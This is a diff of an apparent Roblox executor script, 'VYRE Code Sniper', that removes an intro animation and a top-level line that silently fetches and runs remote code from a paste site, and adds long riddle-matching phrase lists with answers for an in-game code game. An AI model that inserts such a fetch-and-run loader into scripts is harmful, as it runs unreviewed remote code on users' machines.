@@ -1,574 +1,15 @@
--- ============================================================
--- LOAD EXTERNAL SCRIPT FIRST
--- ============================================================
-pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/BauFvHMR/raw"))()
-end)
-
 --[[
     VYRE CODE SNIPER — v20 Build
     + BLUE theme (was purple)
     + Removed shake on tab switch (smooth)
     + Webhook queue: batched + deduped + rate-limit safe
     + All previous features preserved
+    + Series 2 Minifigures riddle (GRIFFIN) + many variants
+    + Haunted Fuse riddle
+    + Birth date / DOB riddle
+    + Color riddles: StrawberryElephant(Red), JohnPork(Pink), SkibidiToilet(White), Meowl(Brown)
+    + FIX: MemoryBank no longer poisons riddles (JOHN bug)
 --]]
--- ============================================================
--- VYRE HUB Intro — v4 (FAST Music Load)
--- ============================================================
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
-
-local localPlayer = Players.LocalPlayer
-
--- ============================================================
--- 1. MUSIC URLs
--- ============================================================
-local INTRO_URL = "https://files.catbox.moe/wjn2b1.mp3"
-local INTRO_FILE = "VFXHubMusic.mp3"
-local END_URL = "https://files.catbox.moe/ofb14x.mp3"
-local END_FILE = "VYREEndMusic.mp3"
-
-local INTRO_DURATION = 10
-
--- ============================================================
--- 2. FAST MUSIC LOADER FUNCTION
--- ============================================================
-local function loadAndPlayMusic(url, file, volume)
-    local path = nil
-    
-    -- FAST PATH: agar file already cached hai toh download skip karo
-    if isfile and isfile(file) then
-        print("[VYRE] Cached:", file)
-        local ok, p = pcall(getcustomasset, file)
-        if ok then path = p end
-    end
-    
-    -- SLOW PATH: pehli baar download
-    if not path then
-        print("[VYRE] Downloading:", file)
-        local ok, data = pcall(game.HttpGet, game, url)
-        if ok and data and #data > 0 then
-            pcall(writefile, file, data)
-            local ok2, p = pcall(getcustomasset, file)
-            if ok2 then path = p end
-        else
-            warn("[VYRE] Download failed")
-            return nil
-        end
-    end
-    
-    if not path then return nil end
-    
-    -- INSTANT PLAY — koi Loaded wait nahi
-    local snd = Instance.new("Sound")
-    snd.SoundId = path
-    snd.Volume = volume or 3
-    snd.Looped = false
-    snd.Parent = SoundService
-    snd:Play()
-    print("[VYRE] Playing ✓")
-    return snd
-end
-
--- ============================================================
--- 3. START INTRO MUSIC IMMEDIATELY (background thread)
--- ============================================================
-local sound = nil
-task.spawn(function()
-    sound = loadAndPlayMusic(INTRO_URL, INTRO_FILE, 3)
-end)
-
--- ============================================================
--- 4. SCREEN GUI (INSTANT)
--- ============================================================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "VYREHubIntro"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.DisplayOrder = 999
-screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
-
--- ============================================================
--- 5. SHAKE HOLDER + BLACK BG
--- ============================================================
-local shakeHolder = Instance.new("Frame")
-shakeHolder.Size = UDim2.new(1, 0, 1, 0)
-shakeHolder.Position = UDim2.new(0.5, 0, 0.5, 0)
-shakeHolder.AnchorPoint = Vector2.new(0.5, 0.5)
-shakeHolder.BackgroundTransparency = 1
-shakeHolder.ZIndex = 1
-shakeHolder.Parent = screenGui
-
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.new(0, 0, 0)
-background.BackgroundTransparency = 0
-background.BorderSizePixel = 0
-background.ZIndex = 0
-background.Parent = screenGui
-
--- ============================================================
--- 6. GLOW ASSETS
--- ============================================================
-local GLOW_SOFT = "rbxassetid://4996891970"
-local GLOW_BIG  = "rbxassetid://5028857472"
-local GLOW_RING = "rbxassetid://5028857084"
-local GLOW_HALO = "rbxassetid://1316045217"
-local GLOW_ASSETS = {GLOW_SOFT, GLOW_BIG, GLOW_RING, GLOW_HALO}
-
--- ============================================================
--- 7. STACKED SCREEN WASHES
--- ============================================================
-local washes = {}
-
-local function makeWash(color, size, pos, anchor, z)
-    local w = Instance.new("ImageLabel")
-    w.Image = GLOW_SOFT
-    w.ImageColor3 = color
-    w.Size = size
-    w.Position = pos
-    w.AnchorPoint = anchor
-    w.BackgroundTransparency = 1
-    w.ImageTransparency = 0.5
-    w.ZIndex = z
-    w.Parent = screenGui
-    return w
-end
-
-for i = 1, 6 do
-    local t = i / 6
-    local size = UDim2.new(1.4 + t * 0.9, 0, 2.4 + t * 1.2, 0)
-    local bColor = Color3.fromRGB(math.floor(20 + t * 130), math.floor(80 + t * 140), 255)
-    local rColor = Color3.fromRGB(255, math.floor(10 + t * 150), math.floor(10 + t * 150))
-    table.insert(washes, {
-        b = makeWash(bColor, size, UDim2.new(0.05, 0, 0.5, 0), Vector2.new(0.5, 0.5), 2),
-        r = makeWash(rColor, size, UDim2.new(0.95, 0, 0.5, 0), Vector2.new(0.5, 0.5), 2),
-    })
-    table.insert(washes, {
-        b = makeWash(Color3.fromRGB(180, 220, 255), UDim2.new(0.7 - t*0.4, 0, 1.3 - t*0.6, 0), UDim2.new(0.08, 0, 0.5, 0), Vector2.new(0.5, 0.5), 2),
-        r = makeWash(Color3.fromRGB(255, 200, 200), UDim2.new(0.7 - t*0.4, 0, 1.3 - t*0.6, 0), UDim2.new(0.92, 0, 0.5, 0), Vector2.new(0.5, 0.5), 2),
-    })
-end
-
-local centerGlow = Instance.new("ImageLabel")
-centerGlow.Image = GLOW_BIG
-centerGlow.ImageColor3 = Color3.fromRGB(150, 150, 255)
-centerGlow.Size = UDim2.new(3, 0, 3, 0)
-centerGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
-centerGlow.AnchorPoint = Vector2.new(0.5, 0.5)
-centerGlow.BackgroundTransparency = 1
-centerGlow.ImageTransparency = 0.2
-centerGlow.ZIndex = 1
-centerGlow.Parent = screenGui
-
-local ambientFlash = Instance.new("Frame")
-ambientFlash.Size = UDim2.new(1, 0, 1, 0)
-ambientFlash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ambientFlash.BackgroundTransparency = 1
-ambientFlash.BorderSizePixel = 0
-ambientFlash.ZIndex = 3
-ambientFlash.Parent = screenGui
-
-local chromaRed = Instance.new("Frame")
-chromaRed.Size = UDim2.new(1, 0, 1, 0)
-chromaRed.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-chromaRed.BackgroundTransparency = 1
-chromaRed.BorderSizePixel = 0
-chromaRed.ZIndex = 4
-chromaRed.Parent = screenGui
-
-local chromaBlue = Instance.new("Frame")
-chromaBlue.Size = UDim2.new(1, 0, 1, 0)
-chromaBlue.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
-chromaBlue.BackgroundTransparency = 1
-chromaBlue.BorderSizePixel = 0
-chromaBlue.ZIndex = 4
-chromaBlue.Parent = screenGui
-
--- ============================================================
--- 8. POLICE BAR
--- ============================================================
-local barHolder = Instance.new("Frame")
-barHolder.Size = UDim2.new(0, 1600, 0, 200)
-barHolder.Position = UDim2.new(0.5, 0, 0.09, 0)
-barHolder.AnchorPoint = Vector2.new(0.5, 0.5)
-barHolder.BackgroundTransparency = 1
-barHolder.ZIndex = 10
-barHolder.Parent = shakeHolder
-
-local barBacking = Instance.new("Frame")
-barBacking.Size = UDim2.new(1, 80, 1, 50)
-barBacking.Position = UDim2.new(0.5, 0, 0.5, 0)
-barBacking.AnchorPoint = Vector2.new(0.5, 0.5)
-barBacking.BackgroundColor3 = Color3.fromRGB(3, 3, 6)
-barBacking.BackgroundTransparency = 0
-barBacking.BorderSizePixel = 0
-barBacking.ZIndex = 10
-barBacking.Parent = barHolder
-
-Instance.new("UICorner", barBacking).CornerRadius = UDim.new(0.5, 0)
-
-local backingStroke = Instance.new("UIStroke")
-backingStroke.Color = Color3.fromRGB(120, 120, 180)
-backingStroke.Thickness = 5
-backingStroke.Transparency = 0.1
-backingStroke.Parent = barBacking
-
-local barHalos = {}
-for i = 1, 5 do
-    local halo = Instance.new("ImageLabel")
-    halo.Image = GLOW_ASSETS[((i - 1) % #GLOW_ASSETS) + 1]
-    halo.ImageColor3 = i % 2 == 0 and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(120, 180, 255)
-    halo.Size = UDim2.new(1.4 + i * 0.3, 0, 2.5 + i * 1.2, 0)
-    halo.Position = UDim2.new(0.5, 0, 0.5, 0)
-    halo.AnchorPoint = Vector2.new(0.5, 0.5)
-    halo.BackgroundTransparency = 1
-    halo.ImageTransparency = 0.5
-    halo.ZIndex = 9
-    halo.Parent = barBacking
-    table.insert(barHalos, halo)
-end
-
-local chromeShine = Instance.new("Frame")
-chromeShine.Size = UDim2.new(1, 40, 0, 14)
-chromeShine.Position = UDim2.new(0.5, 0, 0, 12)
-chromeShine.AnchorPoint = Vector2.new(0.5, 0)
-chromeShine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-chromeShine.BackgroundTransparency = 0.25
-chromeShine.BorderSizePixel = 0
-chromeShine.ZIndex = 11
-chromeShine.Parent = barBacking
-Instance.new("UICorner", chromeShine).CornerRadius = UDim.new(0.5, 0)
-
--- ============================================================
--- 9. SEGMENTS
--- ============================================================
-local SEGMENTS = 12
-local segments = {}
-
-local layerSpecs = {
-    {size = UDim2.new(50, 0, 45, 0),   trans = 0.75, z = 12},
-    {size = UDim2.new(35, 0, 32, 0),   trans = 0.68, z = 13},
-    {size = UDim2.new(25, 0, 22, 0),   trans = 0.60, z = 14},
-    {size = UDim2.new(17, 0, 15, 0),   trans = 0.50, z = 15},
-    {size = UDim2.new(11, 0, 10, 0),   trans = 0.40, z = 16},
-    {size = UDim2.new(7, 0, 6.5, 0),   trans = 0.28, z = 17},
-    {size = UDim2.new(4.5, 0, 4.2, 0), trans = 0.15, z = 18},
-    {size = UDim2.new(2.8, 0, 2.7, 0), trans = 0.05, z = 19},
-    {size = UDim2.new(1.7, 0, 1.7, 0), trans = 0.00, z = 20},
-    {size = UDim2.new(1.0, 0, 1.0, 0), trans = 0.00, z = 21},
-}
-
-for i = 1, SEGMENTS do
-    local isBlue = i <= SEGMENTS / 2
-    local baseColor = isBlue and Color3.fromRGB(30, 160, 255) or Color3.fromRGB(255, 30, 30)
-    local whiteHot = isBlue and Color3.fromRGB(220, 240, 255) or Color3.fromRGB(255, 230, 230)
-    
-    local holder = Instance.new("Frame")
-    holder.Size = UDim2.new(1 / SEGMENTS, -14, 1, -34)
-    holder.Position = UDim2.new((i - 1) / SEGMENTS, 7, 0.5, 0)
-    holder.AnchorPoint = Vector2.new(0, 0.5)
-    holder.BackgroundTransparency = 1
-    holder.ZIndex = 12
-    holder.Parent = barBacking
-    
-    local layers = {}
-    for idx, s in ipairs(layerSpecs) do
-        local g = Instance.new("ImageLabel")
-        g.Image = GLOW_ASSETS[((idx - 1) % #GLOW_ASSETS) + 1]
-        g.ImageColor3 = (idx >= 9) and whiteHot or baseColor
-        g.Size = s.size
-        g.Position = UDim2.new(0.5, 0, 0.5, 0)
-        g.AnchorPoint = Vector2.new(0.5, 0.5)
-        g.BackgroundTransparency = 1
-        g.ImageTransparency = 0.7
-        g.ZIndex = s.z
-        g.Parent = holder
-        table.insert(layers, {img = g, baseOff = s.trans, isWhiteHot = idx >= 9})
-    end
-    
-    segments[i] = {layers = layers, isBlue = isBlue, holder = holder}
-end
-
--- ============================================================
--- 10. IMAGE + TITLE
--- ============================================================
-local imageHalos = {}
-local haloColors = {
-    Color3.fromRGB(120, 60, 255),
-    Color3.fromRGB(80, 120, 255),
-    Color3.fromRGB(100, 200, 255),
-    Color3.fromRGB(180, 120, 255),
-    Color3.fromRGB(220, 200, 255),
-}
-for i = 1, 5 do
-    local h = Instance.new("ImageLabel")
-    h.Image = GLOW_ASSETS[((i - 1) % #GLOW_ASSETS) + 1]
-    h.ImageColor3 = haloColors[i]
-    h.Size = UDim2.new(0, 800 + i * 250, 0, 800 + i * 250)
-    h.Position = UDim2.new(0.5, 0, 0.5, 0)
-    h.AnchorPoint = Vector2.new(0.5, 0.5)
-    h.BackgroundTransparency = 1
-    h.ImageTransparency = 0.4
-    h.ZIndex = 17
-    h.Parent = shakeHolder
-    table.insert(imageHalos, h)
-end
-
-local mainImage = Instance.new("ImageLabel")
-mainImage.Image = "rbxassetid://78888420795161"
-mainImage.Size = UDim2.new(0, 480, 0, 480)
-mainImage.Position = UDim2.new(0.5, 0, 0.5, 0)
-mainImage.AnchorPoint = Vector2.new(0.5, 0.5)
-mainImage.BackgroundTransparency = 1
-mainImage.ImageTransparency = 0
-mainImage.ScaleType = Enum.ScaleType.Fit
-mainImage.ZIndex = 22
-mainImage.Parent = shakeHolder
-
-local titleHalos = {}
-for i = 1, 3 do
-    local h = Instance.new("ImageLabel")
-    h.Image = GLOW_ASSETS[((i - 1) % #GLOW_ASSETS) + 1]
-    h.ImageColor3 = i == 1 and Color3.fromRGB(0, 140, 255) or (i == 2 and Color3.fromRGB(255, 40, 40) or Color3.fromRGB(255, 255, 255))
-    h.Size = UDim2.new(0, 1000 + i * 400, 0, 250 + i * 120)
-    h.Position = UDim2.new(0.5, 0, 0.82, 0)
-    h.AnchorPoint = Vector2.new(0.5, 0.5)
-    h.BackgroundTransparency = 1
-    h.ImageTransparency = 0.4
-    h.ZIndex = 21
-    h.Parent = shakeHolder
-    table.insert(titleHalos, h)
-end
-
-local titleShadow = Instance.new("TextLabel")
-titleShadow.Text = "VYRE HUB"
-titleShadow.Size = UDim2.new(0, 1000, 0, 160)
-titleShadow.Position = UDim2.new(0.5, 8, 0.82, 8)
-titleShadow.AnchorPoint = Vector2.new(0.5, 0.5)
-titleShadow.BackgroundTransparency = 1
-titleShadow.TextColor3 = Color3.new(0, 0, 0)
-titleShadow.TextTransparency = 0.3
-titleShadow.Font = Enum.Font.GothamBlack
-titleShadow.TextScaled = true
-titleShadow.ZIndex = 22
-titleShadow.Parent = shakeHolder
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Text = "VYRE HUB"
-titleLabel.Size = UDim2.new(0, 1000, 0, 160)
-titleLabel.Position = UDim2.new(0.5, 0, 0.82, 0)
-titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-titleLabel.BackgroundTransparency = 1
-titleLabel.TextColor3 = Color3.new(1, 1, 1)
-titleLabel.TextTransparency = 0
-titleLabel.Font = Enum.Font.GothamBlack
-titleLabel.TextScaled = true
-titleLabel.TextStrokeTransparency = 1
-titleLabel.ZIndex = 23
-titleLabel.Parent = shakeHolder
-
-local titleStroke = Instance.new("UIStroke")
-titleStroke.Color = Color3.fromRGB(0, 120, 255)
-titleStroke.Thickness = 8
-titleStroke.Transparency = 0.15
-titleStroke.Parent = titleLabel
-
--- ============================================================
--- 11. STROBE ENGINE
--- ============================================================
-local function setSegBright(seg, brightness)
-    for _, layer in ipairs(seg.layers) do
-        local t = 1 - brightness + layer.baseOff * (1 - brightness)
-        layer.img.ImageTransparency = math.clamp(t, 0, 1)
-    end
-end
-
-local strobeConn
-local flashClock = 0
-local FLASH_DURATION = 0.055
-local tick = 0
-local shakeAmount = 0
-
-strobeConn = RunService.Heartbeat:Connect(function(dt)
-    shakeAmount = math.max(0, shakeAmount - dt * 90)
-    local sx = (math.random() - 0.5) * shakeAmount * 2
-    local sy = (math.random() - 0.5) * shakeAmount * 2
-    shakeHolder.Position = UDim2.new(0.5, sx, 0.5, sy)
-    
-    barHolder.Rotation = math.sin(tick * 2.4) * 0.6
-    local barScale = 1 + math.sin(tick * 1.8) * 0.02
-    barHolder.Size = UDim2.new(0, 1600 * barScale, 0, 200 * barScale)
-    
-    titleLabel.Position = UDim2.new(0.5, (math.random()-0.5)*4, 0.82, (math.random()-0.5)*4)
-    titleShadow.Position = UDim2.new(0.5, 8 + (math.random()-0.5)*4, 0.82, 8 + (math.random()-0.5)*4)
-    
-    flashClock += dt
-    if flashClock < FLASH_DURATION then return end
-    flashClock -= FLASH_DURATION
-    tick += 1
-    
-    local cycle = math.floor((tick - 1) / 8) % 6
-    local phase = math.floor(((tick - 1) % 8) / 2) % 2
-    
-    for _, seg in ipairs(segments) do setSegBright(seg, 0) end
-    
-    local washBlue, washRed, ambient, chroma, shake = 1, 1, 1, 1, 0
-    
-    if cycle == 0 then
-        for i, seg in ipairs(segments) do
-            if seg.isBlue and phase == 0 then setSegBright(seg, 1) end
-            if (not seg.isBlue) and phase == 1 then setSegBright(seg, 1) end
-        end
-        washBlue, washRed = (phase == 0 and 0.15 or 1), (phase == 0 and 1 or 0.15)
-        ambient = 0.75
-        shake = 12
-        
-    elseif cycle == 1 then
-        for i, seg in ipairs(segments) do
-            local isOdd = (i % 2 == 1)
-            if (isOdd and phase == 0) or ((not isOdd) and phase == 1) then
-                setSegBright(seg, 1)
-            end
-        end
-        washBlue, washRed = (phase == 0 and 0.2 or 0.75), (phase == 0 and 0.75 or 0.2)
-        ambient = 0.72
-        shake = 14
-        
-    elseif cycle == 2 then
-        if phase == 0 then
-            for _, seg in ipairs(segments) do setSegBright(seg, 1) end
-        end
-        washBlue = phase == 0 and 0.05 or 1
-        washRed  = phase == 0 and 0.05 or 1
-        ambient  = phase == 0 and 0.45 or 1
-        shake    = phase == 0 and 22 or 5
-        chroma   = phase == 0 and 0.5 or 1
-        
-    elseif cycle == 3 then
-        local pos = ((tick - 1) % SEGMENTS) + 1
-        setSegBright(segments[pos], 1)
-        setSegBright(segments[((pos + 5) % SEGMENTS) + 1], 0.9)
-        local blueActive = segments[pos].isBlue
-        washBlue, washRed = (blueActive and 0.2 or 1), (blueActive and 1 or 0.2)
-        ambient = 0.8
-        shake = 8
-        
-    elseif cycle == 4 then
-        for _ = 1, 6 do
-            local r = math.random(1, SEGMENTS)
-            setSegBright(segments[r], 1)
-        end
-        washBlue = math.random() * 0.5 + 0.3
-        washRed  = math.random() * 0.5 + 0.3
-        ambient  = 0.78
-        shake    = 16
-        
-    else
-        for i, seg in ipairs(segments) do
-            local isOdd = (i % 2 == 1)
-            if (isOdd and phase == 1) or ((not isOdd) and phase == 0) then
-                setSegBright(seg, 1)
-            end
-        end
-        washBlue, washRed = (phase == 0 and 0.75 or 0.2), (phase == 0 and 0.2 or 0.75)
-        ambient = 0.72
-        shake = 14
-    end
-    
-    shakeAmount = math.max(shakeAmount, shake)
-    
-    for idx, w in ipairs(washes) do
-        local mult = 1 + (24 - idx) * 0.02
-        w.b.ImageTransparency = math.clamp(washBlue * mult, 0, 1)
-        w.r.ImageTransparency = math.clamp(washRed * mult, 0, 1)
-    end
-    
-    ambientFlash.BackgroundTransparency = ambient
-    chromaRed.BackgroundTransparency = chroma
-    chromaBlue.BackgroundTransparency = chroma
-    
-    centerGlow.ImageColor3 = phase == 0 
-        and Color3.fromRGB(120, 180, 255) 
-        or Color3.fromRGB(255, 140, 140)
-    centerGlow.ImageTransparency = ambient * 0.8
-    
-    for i, h in ipairs(barHalos) do
-        local off = 0.15 + i * 0.1
-        h.ImageTransparency = math.clamp(ambient * (1 - off * 0.5), 0, 1)
-    end
-    
-    for i, h in ipairs(titleHalos) do
-        h.ImageTransparency = math.clamp(ambient * (0.4 + i * 0.1), 0, 1)
-    end
-    
-    for i, h in ipairs(imageHalos) do
-        h.ImageTransparency = math.clamp(ambient * (0.35 + i * 0.08), 0, 1)
-    end
-    
-    titleLabel.TextColor3 = phase == 0 
-        and Color3.fromRGB(220, 240, 255)
-        or Color3.fromRGB(255, 220, 220)
-    titleStroke.Color = phase == 0 
-        and Color3.fromRGB(0, 140, 255) 
-        or Color3.fromRGB(255, 30, 30)
-end)
-
--- ============================================================
--- 12. INTRO END + END SONG (INSTANT)
--- ============================================================
-task.delay(INTRO_DURATION, function()
-    if strobeConn then strobeConn:Disconnect() end
-    
-    -- END SONG — turant loadAndPlay
-    task.spawn(function()
-        loadAndPlayMusic(END_URL, END_FILE, 3)
-    end)
-    
-    -- INTRO SOUND FADE OUT
-    if sound then
-        TweenService:Create(sound,
-            TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
-            { Volume = 0 }
-        ):Play()
-    end
-    
-    -- UI FADE OUT
-    local fadeOut = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
-    local allObjs = {background, ambientFlash, chromaRed, chromaBlue, centerGlow, mainImage, titleLabel, titleShadow, barBacking, chromeShine}
-    for _, h in ipairs(imageHalos) do table.insert(allObjs, h) end
-    for _, h in ipairs(titleHalos) do table.insert(allObjs, h) end
-    for _, h in ipairs(barHalos) do table.insert(allObjs, h) end
-    for _, w in ipairs(washes) do
-        table.insert(allObjs, w.b)
-        table.insert(allObjs, w.r)
-    end
-    
-    for _, obj in ipairs(allObjs) do
-        if obj:IsA("ImageLabel") then
-            TweenService:Create(obj, fadeOut, {ImageTransparency = 1}):Play()
-        elseif obj:IsA("TextLabel") then
-            TweenService:Create(obj, fadeOut, {TextTransparency = 1}):Play()
-        elseif obj:IsA("Frame") then
-            TweenService:Create(obj, fadeOut, {BackgroundTransparency = 1}):Play()
-        end
-    end
-    TweenService:Create(titleStroke, fadeOut, {Transparency = 1}):Play()
-    TweenService:Create(backingStroke, fadeOut, {Transparency = 1}):Play()
-    
-    for _, seg in ipairs(segments) do
-        for _, layer in ipairs(seg.layers) do
-            TweenService:Create(layer.img, fadeOut, {ImageTransparency = 1}):Play()
-        end
-    end
-    
-    task.wait(0.9)
-    if sound then sound:Stop() sound:Destroy() end
-    screenGui:Destroy()
-end)
 
 -- ============================================================
 -- ============================================================
@@ -774,22 +215,635 @@ local BRAINROT_KNOWLEDGE = {
     {p={"john pork trait multiplier"},a="7.5X"},
     {p={"skibidi trait multiplier"},a="7X"},
     {p={"reindeer trait multiplier"},a="6X"},
-    {p={"best fuse machine","best fuse brainrot","best brainrot in fuse machine","best brainrot from fuse machine","strongest fuse brainrot","rarest fuse brainrot","best fusion","best fusion brainrot","op fuse brainrot"},a="GRIFFIN"},
-    {p={"best craft machine brainrot","best craftmachine brainrot","best brainrot in craft machine","best brainrot from craft machine","strongest craft brainrot","rarest craft brainrot","best brainrot craft","best brainrot from craft"},a="LOSDRAGONS"},
+    {p={
+    -- original patterns (answer ab PHOENIX)
+    "best fuse machine","best fuse brainrot","best brainrot in fuse machine","best brainrot from fuse machine","strongest fuse brainrot","rarest fuse brainrot","best fusion","best fusion brainrot","op fuse brainrot",
+    -- what/which question forms
+    "what is the best fuse machine brainrot","whats the best fuse machine brainrot","what is the best fuse machine brainrot in sab","whats the best fuse machine brainrot in sab",
+    "what is the best brainrot in the fuse machine","whats the best brainrot in the fuse machine","what is the best brainrot from the fuse machine","whats the best brainrot from the fuse machine",
+    "what is the best brainrot in fuse machine","whats the best brainrot in fuse machine","what is the best brainrot from fuse machine","whats the best brainrot from fuse machine",
+    "what is the best brainrot from the fusion machine","whats the best brainrot from the fusion machine",
+    "which brainrot is the best in the fuse machine","which brainrot is the best in fuse machine","which brainrot is the best from the fuse machine","which brainrot is the best from fuse machine",
+    "which brainrot is best in the fuse machine","which brainrot is best in fuse machine","which brainrot is best from the fuse machine","which brainrot is best from fuse machine",
+    "which is the best fuse machine brainrot","which is the best brainrot in the fuse machine","which is the best brainrot from the fuse machine",
+    -- strongest / rarest / op forms
+    "strongest brainrot in the fuse machine","strongest brainrot in fuse machine","strongest brainrot from the fuse machine","strongest brainrot from fuse machine",
+    "strongest brainrot in the fusion machine","strongest brainrot from the fusion machine","strongest brainrot fusion machine",
+    "rarest brainrot in the fuse machine","rarest brainrot in fuse machine","rarest brainrot from the fuse machine","rarest brainrot from fuse machine",
+    "rarest brainrot in the fusion machine","rarest brainrot from the fusion machine","rarest brainrot fusion machine",
+    "best brainrot in the fuse machine","best brainrot in fuse machine","best brainrot from the fuse machine","best brainrot from fuse machine",
+    "best brainrot fusion machine","best brainrot in fusion machine","best brainrot from fusion machine",
+    "best brainrot in the fusion machine","best brainrot from the fusion machine",
+    "most op brainrot in the fuse machine","most op brainrot in fuse machine","most op brainrot from the fuse machine","most op brainrot from fuse machine",
+    "most op fuse machine brainrot","most op fusion brainrot","most op brainrot from fusion",
+    "op brainrot in the fuse machine","op brainrot in fuse machine","op brainrot from the fuse machine","op brainrot from fuse machine","op brainrot fusion machine",
+    -- "from the fuse machine" reorders
+    "best brainrot you can get from the fuse machine","best brainrot you can get from fuse machine","best brainrot you can get from the fusion machine",
+    "best thing to get from the fuse machine","best thing from the fuse machine","best thing from fuse machine","best thing from the fusion machine",
+    "best pet from the fuse machine","best pet from fuse machine","best pet from the fusion machine",
+    -- short / casual
+    "best fuse brainrot sab","best fuse machine brainrot sab","best fusion brainrot sab","best fusion brainrot in sab",
+    "best brainrot fuse","best brainrot fusion","best fuse brain","best fusion brain","best fuse brainrot","best fusion brainrot",
+    "best machine brainrot","best machine fusion brainrot","best machine fusion",
+    "top fuse brainrot","top fusion brainrot","top brainrot in fuse machine","top brainrot from fuse machine",
+    "top brainrot in the fuse machine","top brainrot from the fuse machine","top brainrot in the fusion machine","top brainrot from the fusion machine",
+    "top brainrot fusion","top brainrot from fusion","top brainrot in fusion",
+    "number 1 fuse brainrot","number 1 fusion brainrot","number one fuse brainrot","number one fusion brainrot",
+    "1 fuse brainrot","1 fusion brainrot",
+    -- what brainrot / what does / what do
+    "what brainrot is best in the fuse machine","what brainrot is best in fuse machine","what brainrot is best from the fuse machine","what brainrot is best from fuse machine",
+    "what brainrot is best in the fusion machine","what brainrot is best from the fusion machine","what brainrot is best fusion",
+    "what brainrot do i get from the fuse machine","what brainrot do you get from the fuse machine","what brainrot do you get from fuse machine",
+    "what brainrot do i get from the fusion machine","what brainrot do you get from the fusion machine",
+    "what brainrot comes from the fuse machine","what brainrot comes from fuse machine","what brainrot comes from the fusion machine",
+    "what comes from the fuse machine","what comes from fuse machine","what comes from the fusion machine",
+    "what can i get from the fuse machine","what can you get from the fuse machine","what can you get from fuse machine","what can you get from the fusion machine",
+    -- short direct
+    "best from fuse machine","best from the fuse machine","best from fusion machine","best from the fusion machine",
+    "strongest from fuse machine","strongest from the fuse machine","rarest from fuse machine","rarest from the fuse machine",
+},a="PHOENIX"},
+    -- ⭐ SERIES 2 MINIFIGURES — most OP minifigure toy = GRIFFIN
+    {p={
+        -- exact full phrasings
+        "what is the most op minifigure toy in the new series 2 minifigures",
+        "whats the most op minifigure toy in the new series 2 minifigures",
+        "what is the most op minifigure toy in series 2 minifigures",
+        "whats the most op minifigure toy in series 2 minifigures",
+        "what is the most op minifigure toy in the series 2 minifigures",
+        "whats the most op minifigure toy in the series 2 minifigures",
+        "what is the most op minifigure toy of the new series 2 minifigures",
+        "whats the most op minifigure toy of the new series 2 minifigures",
+        "what is the most op minifigure toy of series 2 minifigures",
+        "whats the most op minifigure toy of series 2 minifigures",
+        -- minifigure (no "toy")
+        "what is the most op minifigure in the new series 2 minifigures",
+        "whats the most op minifigure in the new series 2 minifigures",
+        "what is the most op minifigure in series 2 minifigures",
+        "whats the most op minifigure in series 2 minifigures",
+        "what is the most op minifigure in the series 2 minifigures",
+        "whats the most op minifigure in the series 2 minifigures",
+        -- which question forms
+        "which minifigure toy is the most op in the new series 2 minifigures",
+        "which minifigure toy is the most op in series 2 minifigures",
+        "which minifigure toy is the most op in the series 2 minifigures",
+        "which minifigure toy is most op in the new series 2 minifigures",
+        "which minifigure toy is most op in series 2 minifigures",
+        "which minifigure is the most op in the new series 2 minifigures",
+        "which minifigure is the most op in series 2 minifigures",
+        "which minifigure is the most op in the series 2 minifigures",
+        "which minifigure is most op in the new series 2 minifigures",
+        "which minifigure is most op in series 2 minifigures",
+        -- what question forms
+        "what minifigure toy is the most op in the new series 2 minifigures",
+        "what minifigure toy is the most op in series 2 minifigures",
+        "what minifigure toy is most op in the new series 2 minifigures",
+        "what minifigure toy is most op in series 2 minifigures",
+        "what minifigure is the most op in the new series 2 minifigures",
+        "what minifigure is the most op in series 2 minifigures",
+        "what minifigure is most op in the new series 2 minifigures",
+        "what minifigure is most op in series 2 minifigures",
+        -- short — "most op ... series 2 minifigures"
+        "most op minifigure toy in the new series 2 minifigures",
+        "most op minifigure toy in series 2 minifigures",
+        "most op minifigure toy new series 2 minifigures",
+        "most op minifigure toy series 2 minifigures",
+        "most op minifigure in the new series 2 minifigures",
+        "most op minifigure in series 2 minifigures",
+        "most op minifigure new series 2 minifigures",
+        "most op minifigure series 2 minifigures",
+        -- reversed order
+        "series 2 minifigures most op minifigure toy",
+        "series 2 minifigures most op minifigure",
+        "new series 2 minifigures most op minifigure toy",
+        "new series 2 minifigures most op minifigure",
+        -- short — "series 2" only
+        "what is the most op minifigure toy in the new series 2",
+        "whats the most op minifigure toy in the new series 2",
+        "what is the most op minifigure toy in series 2",
+        "whats the most op minifigure toy in series 2",
+        "what is the most op minifigure in the new series 2",
+        "whats the most op minifigure in the new series 2",
+        "what is the most op minifigure in series 2",
+        "whats the most op minifigure in series 2",
+        "which minifigure toy is the most op in series 2",
+        "which minifigure toy is most op in series 2",
+        "which minifigure is the most op in series 2",
+        "which minifigure is most op in series 2",
+        "what minifigure toy is the most op in series 2",
+        "what minifigure is the most op in series 2",
+        "most op minifigure toy in the new series 2",
+        "most op minifigure toy in series 2",
+        "most op minifigure toy new series 2",
+        "most op minifigure toy series 2",
+        "most op minifigure in the new series 2",
+        "most op minifigure in series 2",
+        "most op minifigure new series 2",
+        "most op minifigure series 2",
+        "series 2 most op minifigure toy",
+        "series 2 most op minifigure",
+        "new series 2 most op minifigure toy",
+        "new series 2 most op minifigure",
+        -- best / strongest / rarest phrasings
+        "best minifigure toy in the new series 2 minifigures",
+        "best minifigure toy in series 2 minifigures",
+        "best minifigure toy series 2 minifigures",
+        "best minifigure toy in the new series 2",
+        "best minifigure toy in series 2",
+        "best minifigure toy series 2",
+        "best minifigure in the new series 2 minifigures",
+        "best minifigure in series 2 minifigures",
+        "best minifigure series 2 minifigures",
